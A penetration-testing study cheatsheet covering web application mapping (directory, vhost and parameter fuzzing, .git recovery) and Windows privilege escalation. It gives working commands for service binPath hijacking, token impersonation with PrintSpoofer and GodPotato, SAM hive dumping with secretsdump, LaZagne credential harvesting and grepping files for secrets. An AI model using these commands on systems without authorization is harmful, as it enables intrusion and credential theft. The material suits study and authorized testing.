# Web Mapping Cheatsheet [← Cheatsheet index](README.md) · [Complete HTTP procedure](../reference/02-service-enumeration/10-http-web-mapping.md) · [Next: web exploitation](web-exploitation.md) · [Mechanics](../notes/Master_Notes.md#web-behavior-to-access) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Map useful web behavior](../notes/methods/web-mapping.md) > **Use when:** an HTTP(S) endpoint must become an evidence-labelled application map. Replace placeholders and keep each identity's cookies/tokens separate. ## First five minutes ```bash curl -skL -D headers.txt -o body.html http://TARGET:PORT/ curl -sk -o /dev/null -w 'code=%{http_code} bytes=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' http://TARGET:PORT/ curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/sitemap.xml ``` Record: ```text scheme://host:port | redirect/title/certificate | anonymous/authenticated role METHOD PATH | INPUT | OBJECT/FUNCTION | STATUS/LENGTH/MARKER | NEXT TEST ``` ## Burp manual loop > **Run/context:** use the workstation's browser/proxy and preserve the actual application hostname, cookies and identity. **Decide:** a changed response needs a matched control, not just a status-code comparison. Select the next test through [attack-input routing](#attack-input-routing); if session or routing is broken, use [common failure decisions](#common-failure-decisions) before judging the input. ```text Scope target -> browse normally with Intercept off -> Proxy history -> send interesting request to Repeater -> unchanged baseline -> change one field/header/cookie/method/object -> compare -> save decisive pair ``` Replay curl through Burp: ```bash curl -sk -x http://127.0.0.1:8080 -c cookies.txt -b cookies.txt http://TARGET:PORT/PATH ``` ## Useful artifacts ```bash curl -sk http://TARGET:PORT/.git/HEAD curl -sk http://TARGET:PORT/openapi.json curl -sk http://TARGET:PORT/swagger.json ``` Inspect HTML comments, hidden inputs, forms, JavaScript route strings, `fetch`/XHR calls, source maps, cookies and response headers. ## Content discovery Calibrate with a random nonexistent path, then: ```bash gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -t 10 -o gobuster-ext.txt ``` Authenticated: ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -c 'SESSION=VALUE' -H 'Authorization: Bearer TOKEN' -t 10 -o gobuster-auth.txt ``` Confirmed soft-404 length: ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST --exclude-length NOISE_LENGTH -t 10 -o gobuster-filtered.txt ``` > Check `200`, redirects, `401`, `403` and `405`. A tool result is a candidate until manually reproduced. Alternative engines, same decision: ```bash feroxbuster -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o ferox.txt ffuf -w WORDLIST -u http://TARGET:PORT/FUZZ -ac -of json -o ffuf-content.json wfuzz -c -z file,WORDLIST --hc 404 http://TARGET:PORT/FUZZ ``` `-ac`/status filters are starting points, not proof. Calibrate against random paths and compare stable body markers, lengths and redirects. ## Virtual hosts ```bash gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt ffuf -w WORDLIST -u http://TARGET:PORT/ -H 'Host: FUZZ.DOMAIN' -ac -o ffuf-vhosts.json curl -sk -H 'Host: CANDIDATE.DOMAIN' http://TARGET:PORT/ ``` Compare candidate and random `Host` responses before accepting a vhost. ## Parameters and object values ```bash ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://TARGET:PORT/PATH?FUZZ=test' -ac -o params-get.json ffuf -w WORDLIST -u http://TARGET:PORT/PATH -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'known=value&FUZZ=test' -ac -o params-post.json ffuf -w NUMBERS -u 'http://TARGET:PORT/api/objects/FUZZ' -H 'Authorization: Bearer TOKEN' -mc all -fc 404 -o object-values.json ``` ## APIs ```bash curl -ski http://TARGET:PORT/api/v1/PATH curl -ski -X OPTIONS http://TARGET:PORT/api/v1/PATH curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD"}' http://TARGET:PORT/api/v1/login ``` ```text PATH | METHOD | IDENTITY/ROLE | OBJECT/PROPERTY | RESULT | NEXT ``` `405` often means valid route/wrong method. Validation errors disclose schema candidates. Verify every token through a separate authorized request. ## Attack-input routing | Observed input/behavior | Open | | --- | --- | | filename/path/template/download/upload | [File handling](../reference/03-initial-access/02-web-file-handling.md) | | diagnostic/archive/ping/URL or database-backed field | [Command and SQL injection](../reference/03-initial-access/03-command-and-sql-injection.md) | | object ID, role/property, admin API or rendered user input | [Access control and XSS](../reference/03-initial-access/04-access-control-and-xss.md) | | server-side URL fetch, webhook, preview or import | [WordPress and SSRF](../reference/03-initial-access/05-wordpress-and-ssrf.md) | | WordPress assets, REST routes or login | [WordPress and SSRF](../reference/03-initial-access/05-wordpress-and-ssrf.md) | | exact product/plugin/version candidate | Block 6 public exploits | | credential/token/key | Block 5, then remap authenticated behavior | | verified OS command | Block 7 session handling | ## Common failure decisions | Symptom | Next action | | --- | --- | | All paths return `200` | Measure a random path; filter only confirmed noise | | Browser works, curl fails | Copy exact Host/cookie/token/CSRF/method/content type from Burp | | Repeated login redirects | Refresh auth context; use a separate cookie jar | | `403` | Compare random path; retry only with legitimate new identity | | `405` | Inspect `Allow`, docs and JavaScript; test supported method | | Candidate disappears after filtering | Remove filter and manually compare body markers | ## ffuf with the captured request Save a manually verified raw request as request.txt and place FUZZ at one input. Preserve the correct Host, cookie and body. Choose the actual transport: ```bash ffuf -request request.txt -request-proto https -w WORDLIST -mc all -ac -t 10 -o request-https.json ffuf -request request.txt -request-proto http -w WORDLIST -mc all -ac -t 10 -o request-http.json ``` Replay outliers. Uniform login redirects → refresh the session; changing CSRF tokens → fix token handling before further fuzzing. [Full mapping procedure](../reference/02-service-enumeration/10-http-web-mapping.md). ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Map useful web behavior
Find: Establish scheme, host, redirects and request state Request the assigned HTTP endpoint without following redirects blindly; inspect location, cookies and alternate scheme/hostname behavior. ```bash curl -skD headers.txt -o body.html http://TARGET:PORT/ curl -skI https://TARGET:PORT/ ``` > **Recognize:** The hostname/scheme redirect identifies the application request context to reproduce. > **Validate next:** Confirm the hostname routes to the assigned address and preserve its TLS/Host/session state. [Establish scheme, host, redirects and request state](../notes/methods/web-mapping.md#web-identity).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. Correct scheme/port and virtual host; saved cookies/headers for authenticated comparisons ```bash curl -skL -D headers.txt -o body.html http://TARGET:PORT/ curl -sk -o /dev/null -w 'code=%{http_code} bytes=%{size_download} type=%{content_type} redirect=%{redirect_url}\n' http://TARGET:PORT/ ``` > **Decisive output:** record the scheme, hostname/`Host` header, port, redirects, page title, certificate names, server/framework clues and whether the view is anonymous or authenticated.
Variant — explicit virtual-host candidate ```bash curl -sk -H 'Host: CANDIDATE.DOMAIN' http://TARGET:PORT/ ``` Compare it with a random hostname. A different status alone is weak evidence; compare body, length, title and redirects.
Variant — preserve cookies and follow redirects ```bash curl -skL -c cookies.txt -b cookies.txt http://TARGET:PORT/PATH ``` Use a separate cookie jar per identity. Do not mix anonymous, ordinary-user and administrator evidence.
Variant — replay through Burp Community ```bash curl -sk -x http://127.0.0.1:8080 http://TARGET:PORT/PATH ``` Confirm the proxy listener is active on `127.0.0.1:8080`. Use `-k` only for the controlled lab because it disables destination-certificate verification.
> **Verify:** Record final URL, host, status, redirects, cookies and authentication context before comparing payload results. > **If it fails:** A redirect loop or generic default page may indicate a wrong host or missing session rather than a nonexistent application.
Find: Map functions, roles and normal requests manually Browse the site's normal account, export, upload and download features while recording requests in the browser/proxy. ```bash curl -sk -b cookies.txt -D response-headers.txt http://TARGET:PORT/PATH ``` > **Recognize:** The normal request exposes a file-selecting input discovered through functionality, not guessed from a payload list. > **Validate next:** Find the actual input semantics, account/role and normal response before file/read/authorization tests. [Map functions, roles and normal requests manually](../notes/methods/web-mapping.md#web-behavior).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. A normal request baseline and the relevant account/role; authorized accounts for role comparisons For every visible function, capture one unchanged request in Burp Proxy history, send it to Repeater and record: ```text METHOD PATH | CONTENT-TYPE | ACCESS CONTEXT/ROLE INPUT LOCATION + NAME | BASELINE VALUE STATUS | LENGTH/HASH | REDIRECT | MARKER/ERROR/TIME OBJECT/FUNCTION SELECTED | NEXT ONE-VARIABLE TEST ``` Check login/registration/reset, profiles/objects, search/filter/pagination, download/export/preview, upload/import, administration and every JavaScript API call. > **Next:** a browser-side restriction is not server authorization. Replay the raw request and change one field, object reference, method or access-context element at a time. > **Verify:** Retain method, route, input location, identity and expected normal behavior; do not infer vulnerability from an interesting parameter name. > **If it fails:** Expired sessions, CSRF failures and malformed requests can imitate access-control differences; reproduce a valid baseline first.
Find: Inspect source, backups, configuration and repository artifacts Inspect linked JavaScript/source, robots/sitemaps, relevant backups and a bounded Git metadata check from the mapped web application. ```bash curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/.git/HEAD ``` > **Recognize:** The path and Git reference are investigation leads; neither proves a working secret or complete repository. > **Validate next:** Compare missing-path controls, retrieve actual permitted artifacts and verify recovered history/account context. [Inspect source, backups, configuration and repository artifacts](../notes/methods/web-mapping.md#web-artifacts).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. Readable application artifact or a complete recoverable repository; preserve the public-source scope ```bash curl -sk http://TARGET:PORT/robots.txt curl -sk http://TARGET:PORT/sitemap.xml curl -sk http://TARGET:PORT/.git/HEAD curl -sk http://TARGET:PORT/openapi.json curl -sk http://TARGET:PORT/swagger.json ``` Also inspect HTML comments, hidden inputs, form actions, linked JavaScript, route strings, source-map references, cookies and response headers. > **Decisive output:** a path, parameter, API schema, object identifier, component or secret-bearing artifact that creates a specific next request. Source disclosure is not command execution. ```bash curl -ski http://TARGET:PORT/.git/HEAD curl -ski http://TARGET:PORT/.git/config ``` > A readable `HEAD`/`config` supports exposed repository metadata. A `403`, redirect or generic template is not proof. Preserve the correct host header/base path. If authorized, recover into a new local directory with a purpose-built tool and inspect locally: ```bash git-dumper http://TARGET:PORT/.git/ repo-output git -C repo-output status git -C repo-output log --oneline --all --decorate git -C repo-output log -p --all ``` `git-dumper` is an optional third-party helper; install on demand in an isolated environment only when the exposure has been confirmed. Manual object recovery is possible but slower. ```bash rg -ni 'password|passwd|token|secret|api[_-]?key|private[_-]?key' repo-output git -C repo-output log --all -S'password' --oneline git -C repo-output log --all -G'pass(word)?|secret|token' --oneline ``` Inspect candidate commits without dumping all history: ```bash git -C repo-output show COMMIT -- PATH git -C repo-output diff COMMIT^ COMMIT -- PATH ``` Validate freshness, identity and compatible use. Removed historical values are often rotated or environment-specific. > **Verify:** Confirm actual file/history content and distinguish a historical secret from a usable current credential. > **If it fails:** A 200 soft-404 or incomplete object database is not a recovered repository. Compare known-missing paths and record missing history.
Find: Discover directories and files with controlled response filtering Establish the application's missing-path response, then run a bounded content search with the existing session/host context. ```bash curl -sk -D - http://TARGET:PORT/KNOWN_MISSING_PATH ``` > **Recognize:** The candidate's actual function differs from the soft-404 control despite equal status codes. > **Validate next:** Request a known-missing path under the same host/session and compare status, body and length. Open each distinct Gobuster/ffuf result; a uniform login page or soft-404 is a filter problem, not a directory finding. [Discover directories and files with controlled response filtering](../notes/methods/web-mapping.md#web-content).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. Correct base URL/session and a measured nonexistent-path response; bounded relevant wordlist Request a random nonexistent path first and record its status, length and body marker. ```bash gobuster dir -u http://TARGET:PORT/ -w /usr/share/wordlists/dirb/common.txt -t 10 -o gobuster-root.txt ``` > **Decisive output:** manually verified routes including useful `200`, redirect, `401`, `403` and `405` responses.
Variant — technology-aware extensions ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -t 10 -o gobuster-ext.txt ``` Choose extensions from observed stack evidence; do not spray every extension.
Variant — authenticated discovery ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST -c 'SESSION=VALUE' -H 'Authorization: Bearer TOKEN' -t 10 -o gobuster-auth.txt ``` Use only the cookie or header that applies. An expired session can turn every result into the same login redirect.
Variant — filter a confirmed wildcard body length ```bash gobuster dir -u http://TARGET:PORT/ -w WORDLIST --exclude-length NOISE_LENGTH -t 10 -o gobuster-filtered.txt ``` Filtering without first confirming the noise response can hide a real path.
> **Verify:** Open candidates and record their actual behavior; status/length alone is only a selection clue. > **If it fails:** Aggressive filters can hide genuine routes and rate limiting can fabricate differences; validate the baseline and reduce the request rate.
Find: Discover virtual hosts and hostname-selected applications Collect hostnames from redirects, certificates, DNS and source; compare named requests against an invalid-host control. ```bash curl -sk --resolve HOSTNAME:PORT:TARGET https://HOSTNAME:PORT/ ``` > **Recognize:** A reproducible hostname-selected application is a new mapping target on the same address. > **Validate next:** Send a random Host header as a negative control, compare the candidate's real response, then browse it with the correct hostname. A different status caused only by redirects or a default site is not a confirmed vhost. [Discover virtual hosts and hostname-selected applications](../notes/methods/web-mapping.md#web-vhosts).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. A destination listener, relevant domain candidates and controlled Host/SNI routing ```bash gobuster vhost -u http://DOMAIN:PORT/ --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o vhosts.txt ``` Alternative with automatic calibration: ```bash ffuf -w WORDLIST -u http://TARGET:PORT/ -H 'Host: FUZZ.DOMAIN' -ac -o ffuf-vhosts.json ``` > **Failure cue:** uniform status/length may be the default vhost. Compare each candidate with a random host header before adding it to the application map. > **Verify:** Compare candidate and nonexistent-host responses, including content and redirects; resolve to the intended scoped address. > **If it fails:** A default response for every host or an SNI mismatch makes the result inconclusive; do not treat every guessed hostname as a real application.
Find: Map parameters, API methods, objects and writable properties Capture a valid API request, inspect its schema/client code and compare allowed methods and controlled object/role contexts. ```bash curl -sk -i -b cookies.txt http://TARGET:PORT/api/PATH ``` > **Recognize:** The actual object, method and writable input are known; returned owner/role fields are only candidate security boundaries. > **Validate next:** Determine field binding, ownership, persistence and server authorization with controlled accounts. [Map parameters, API methods, objects and writable properties](../notes/methods/web-mapping.md#web-parameters).
Commands and use-case variants > **Need:** A reachable HTTP application and recorded anonymous or authenticated request state. A valid request and explicit role/object ownership; exact input format and content type GET parameter names: ```bash ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://TARGET:PORT/PATH?FUZZ=test' -ac -o params-get.json ``` POST form parameter names: ```bash ffuf -w WORDLIST -u http://TARGET:PORT/PATH -X POST -H 'Content-Type: application/x-www-form-urlencoded' -d 'known=value&FUZZ=test' -ac -o params-post.json ``` Object values with an authenticated API: ```bash ffuf -w NUMBERS -u 'http://TARGET:PORT/api/objects/FUZZ' -H 'Authorization: Bearer TOKEN' -mc all -fc 404 -o object-values.json ``` > **Decisive output:** a manually reproduced parameter or value that changes application behavior. Tool outliers are candidates, not confirmed access-control flaws.
ffuf — preserve a captured authenticated request Save a working raw request from the proxy as request.txt, retain its Host/cookie/body, and put FUZZ at the single parameter name/value or path being tested. Replay it once manually first. The request file does not specify TLS: choose the transport explicitly. ```bash # HTTPS request, including its original method and session headers ffuf -request request.txt -request-proto https -w WORDLIST -mc all -ac -t 10 -o request-https.json # Plain HTTP request: otherwise ffuf defaults to HTTPS ffuf -request request.txt -request-proto http -w WORDLIST -mc all -ac -t 10 -o request-http.json ``` > **Read:** compare an outlier's status/length/body with a known missing value, then replay that exact request. A login redirect for every value → refresh the session before continuing. A one-time CSRF token → repair token handling; the saved-request flag does not refresh it automatically. [ffuf request configuration](https://github.com/ffuf/ffuf/wiki/Home#request-configuration).
```bash curl -ski http://TARGET:PORT/api/v1/PATH curl -ski -X OPTIONS http://TARGET:PORT/api/v1/PATH curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD"}' http://TARGET:PORT/api/v1/login ``` > **Interpretation:** `405` can establish that a route exists but rejects the method. Validation errors can reveal required fields. A token establishes only the authorization demonstrated by a later request. Build a matrix across anonymous, user A, user B and administrator contexts where available: ```text PATH | METHOD | IDENTITY/ROLE | OBJECT/PROPERTY | RESULT | NEXT ``` > **Verify:** Prove which input is consumed and whether state changes persist in an independent read. > **If it fails:** HTTP 400/415 may indicate encoding/schema rather than security enforcement. Keep a valid request before changing permissions-related properties.
### Additional conditional surfaces Open a branch only when its observation and prerequisites match. Discovery-only entries retain their missing-action boundary.
Map an authentication, session or multistep web flow - **Enter:** the application exposes login, registration, recovery, role change, state-changing business action, authenticated API or another session-dependent flow. - **Discover:** capture a working anonymous and/or authenticated request, then record method, scheme/host/path, headers, cookies/tokens, body fields, hidden values, redirects, role and each step required to complete the action. Include non-GET/POST methods, JSON/XML bodies and WebSocket/API messages when the application actually uses them. - **Validate:** replay the unchanged request first; then change one identity, object, property or session boundary at a time. Confirm freshness, CSRF/token coupling, object ownership and whether the result is server-side rather than a browser-only presentation change. - **Execute:** [HTTP and web mapping](../reference/02-service-enumeration/10-http-web-mapping.md), then route only the demonstrated effect to the existing parameter, authorization, IDOR, mass-assignment, XSS, parser or command/SQL method. - **Verify:** preserve one reproducible request/response pair and the exact role/session/object delta. Mapping a field or flow is not itself exploitation. - **Outcomes:** controlled unauthorized effect → [application authorization](../notes/methods/web-exploitation.md#web-authz) or the matching primitive; invariant authorization/ownership enforcement → ruled out for that transition; token expiry, cache, redirect or client-side behavior masks the result → inconclusive/[failed-boundary diagnosis](../notes/methods/execution.md#execution-format). - **Source:** [OWASP WSTG entry-point mapping](https://wstg.owasp.org/stable/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points/). [Notes and interpretation](../notes/Attack_Surface_Supplements.md#surface-S12).

# Windows Privilege Escalation Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md) | [Credential use](../reference/04-shells-transfers-credentials/03-credential-use-and-cracking.md) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Escalate privileges on Windows](../notes/methods/windows-privesc.md) ```text TOKEN → CONTROLLED INPUT → EFFECTIVE RIGHT → PRIVILEGED CONSUMER → RUN-AS → TRIGGER → VERIFIED EFFECT ``` ## Early tool-assisted pass Use a reviewed, transferred build in the current host context. Save output and select a concrete finding; a highlight is not the elevated identity. ```cmd whoami /all winPEASx64.exe log ``` [Tool-to-finding workflow](../notes/methods/windows-privesc.md#first-pass-tools-and-findings). ## Token and host baseline ```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v ``` ```powershell Get-ComputerInfo | Select WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort InstalledOn -Descending Get-CimInstance Win32_Process | Select ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select Name,State,StartMode,PathName ``` > Record integrity level, enabled/deny-only groups and enabled/present privileges. Medium-integrity Administrators membership is not a high-integrity process. Prefer CIM; WMIC may be absent. `Get-HotFix` is not a complete update inventory. ## Effective ACLs ```cmd icacls "C:\Path\To\OBJECT" sc.exe sdshow SERVICE accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE ``` `F` full · `M` modify · `RX` read/execute · `R` read · `W` write · `D` delete · `I` inherited · `OI` object inherit · `CI` container inherit. > File, directory, registry, service and task ACLs are distinct. Check the exact object/right and current enabled SID. MIC can still block write-up. ## Credentials and artifacts ```cmd cmdkey /list vaultcmd /list vaultcmd /listcreds:"Windows Credentials" /all reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul ``` ```powershell Get-Content -LiteralPath (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } | Select-String 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false ``` > `cmdkey` proves a target-bound stored entry, not plaintext. DPAPI artifacts need the protecting user/machine context. Classify identity/type/scope before reuse. ## Services > **Run/context:** in the current Windows foothold, using its effective token; service names and paths refer to this host. **Decide:** a modifiable file is useful only if a privileged service actually consumes it and a trigger is available. Validate [effective ACLs](#effective-acls); a path-with-spaces lead belongs to [unquoted service paths](#unquoted-service-paths), not an assumed service-configuration right. ```powershell Get-CimInstance Win32_Service | Select Name,StartName,State,StartMode,PathName ``` ```cmd sc.exe qc SERVICE sc.exe sdshow SERVICE icacls "C:\Path\To\service.exe" icacls "C:\Path\To" accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE ``` > Need control + higher `SERVICE_START_NAME` + trigger. `SERVICE_CHANGE_CONFIG`, start and stop are separate rights. Use `sc.exe` in PowerShell; bare `sc` may be `Set-Content`.
Change service path and restore ```cmd sc.exe qc SERVICE sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE" sc.exe stop SERVICE sc.exe start SERVICE sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH" ``` > Space after `binPath=` is required. Error 1053 may still follow payload execution; verify effect and restore.
Replace writable binary ```cmd copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup" copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe" sc.exe stop SERVICE sc.exe start SERVICE ``` > Check parent delete/create rights, file locks, architecture and recovery.
## Unquoted service paths ```powershell Get-CimInstance Win32_Service | Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } | Select Name,StartName,State,StartMode,PathName ``` ```cmd icacls C:\ icacls "C:\Program Files" icacls "C:\Program Files\Vendor App" sc.exe qc SERVICE ``` > For `C:\Program Files\Vendor App\svc.exe`, prove an earlier missing prefix such as `C:\Program.exe` or `C:\Program Files\Vendor.exe` is creatable, service runs higher and trigger exists. ## DLL/helper search ```cmd icacls "C:\Path\To\Application" sc.exe qc SERVICE reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" ``` > Need observed exact DLL request/load, selected writable searched directory, bitness/exports, privileged process and trigger. Account for redirection, API sets, SxS, loaded modules, KnownDLLs and application search flags. Procmon `CreateFile` + `.dll` + `NAME NOT FOUND` is useful when available. ## Scheduled tasks and startup consumers ```cmd schtasks /query /fo LIST /v schtasks /query /tn "\FOLDER\TASK" /xml icacls "C:\Path\To\task-script.ps1" icacls "C:\Path\To" schtasks /run /tn "\FOLDER\TASK" ``` ```powershell Get-ScheduledTask | ForEach-Object { $t=$_ [pscustomobject]@{Task="$($t.TaskPath)$($t.TaskName)";User=$t.Principal.UserId;RunLevel=$t.Principal.RunLevel;Actions=($t.Actions|Out-String).Trim()} } ``` ```cmd reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp" ``` > Need writable consumed action/file plus higher principal and reliable trigger. `Highest` is relative to the task principal. `/run` accepted is not execution proof. ## AlwaysInstallElevated and UAC ```cmd reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi ``` > Run only if **both** values are `0x1`. ```cmd whoami /groups reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin ``` > UAC bypass normally raises an already-admin filtered token; it is not ordinary standard-user escalation. ## Token privileges ```cmd whoami /priv ``` | Privilege | Do not proceed until | | --- | --- | | `SeImpersonatePrivilege` | Privileged auth trigger, build/arch/runtime and tool match | | `SeAssignPrimaryTokenPrivilege` | Useful token and process-creation requirements match | | `SeBackupPrivilege` | Privilege enabled and backup-aware read has useful target | | `SeRestorePrivilege` | Restore-aware write feeds a privileged consumer | | `SeDebugPrivilege` | Target process is useful and not protected from access | | `SeLoadDriverPrivilege` | Driver is compatible/loadable/exploitable; crash risk accepted | | `SeTakeOwnershipPrivilege` | Ownership can become DACL/content control over a consumed object |
Impersonation variants ```cmd PrintSpoofer64.exe -i -c "cmd.exe" GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt" ``` > Pick by actual prerequisite, not “Potato” name. Verify a SYSTEM process/effect with `whoami /all`.
Backup privilege to local hashes ```cmd reg save HKLM\SAM C:\Windows\Temp\SAM.hive reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive ``` ```bash impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL ``` > Matched hives produce local credential material, not automatic SYSTEM or remote authorization.
## Software, drivers and kernel ```powershell Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*', 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | Select DisplayName,DisplayVersion,Publisher,InstallLocation ``` ```cmd systeminfo driverquery /v ``` > Order: deterministic config/credential → exact privileged app → exact driver → kernel last. Validate build, cumulative update, architecture, component/config, exploit source and stability. Avoid `Win32_Product`. ## Automated candidate generation ```cmd winPEASx64.exe log Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt" Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json" ``` ```powershell powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML" Import-Module .\PowerUp.ps1 Invoke-AllChecks ``` > Validate every highlight manually. PrivescCheck may skip checks when elevated; Seatbelt has no official prebuilt binaries; PowerUp upstream is archived. Tool block/failure routes to native checks. ## Failure routing | Symptom | Next action | | --- | --- | | Service config denied | Service DACL/current token; then binary/DLL/config | | No service restart right | Boot/dependency trigger or another path | | Unquoted but no writable prefix | Disprove | | DLL never requested | Search/load evidence, bitness and trigger | | Task accepted/no effect | Action, conditions, working directory, LastTaskResult/history | | Token tool fails | Privilege state, build, runtime and trigger prerequisite | | Hashes/no higher shell | Credential type, account state, protocol and authorization | | Enumerator blocked | Native checks; not “no findings” | ## Verify and re-enumerate ```cmd whoami /all hostname ipconfig /all ``` > Re-enumerate credentials, services, tasks, sessions, listeners, routes and domain context after every identity/integrity change. ## Recover supported application stores with LaZagne Use a reviewed build in the relevant user's context; system-protected stores can require elevation. ```cmd REM Start with the relevant application family laZagne.exe browsers REM Broader collection with a text report laZagne.exe all -oN ``` Keep application, account and source with each value. Test it against the matching service. Empty output → check profile/decryption access and use manual config/history/vault checks. [Full Windows credential hunting](../reference/05-local-privilege-escalation/02-windows-privilege-escalation.md#3-hunt-credentials-and-configuration). ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Escalate privileges on Windows
Find: Establish Windows token, host and process context At a new foothold inspect the complete token and host/service inventory before classifying the session as an administrator. ```cmd whoami /all systeminfo tasklist /svc ``` > **Recognize:** An Administrators SID exists but this effective process is filtered/medium-integrity. > **Validate next:** Check actual enabled privileges and object operations in the process that will perform the action. [Establish Windows token, host and process context](../notes/methods/windows-privesc.md#windows-state).
Commands and use-case variants > **Need:** A verified Windows foothold with a known token, integrity level and groups. A functioning command channel and the actual effective token/process context ```cmd hostname whoami /all systeminfo ipconfig /all route print netstat -ano tasklist /svc query user net user net localgroup Administrators driverquery /v ``` ```powershell Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture Get-HotFix | Sort-Object InstalledOn -Descending Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName Get-LocalUser Get-LocalGroupMember Administrators ``` > **Interpret:** record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. `Get-HotFix` does not list every update; use build/KB output only to form a version hypothesis.
WMIC compatibility fallbacks ```cmd wmic qfe get HotFixID,InstalledOn wmic service get Name,StartName,State,StartMode,PathName wmic process get ProcessId,Name,ExecutablePath,CommandLine ``` > WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.
```cmd whoami /all hostname ipconfig /all ``` After a higher token, re-enumerate protected credentials, services, tasks, sessions, listeners, routes and domain context. Preserve the command, relevant output, trigger and restoration step. For exam use, recheck the current OffSec guide: Windows full-privilege evidence requires SYSTEM, Administrator or an account with Administrator privileges, and AI/LLM use is prohibited during the exam and report phase. > **Verify:** Verify represented user/SID, enabled group/privilege state and actual privileged operation. > **If it fails:** A prompt title or account name is insufficient. WMIC may be absent; use the documented CIM/PowerShell alternatives.
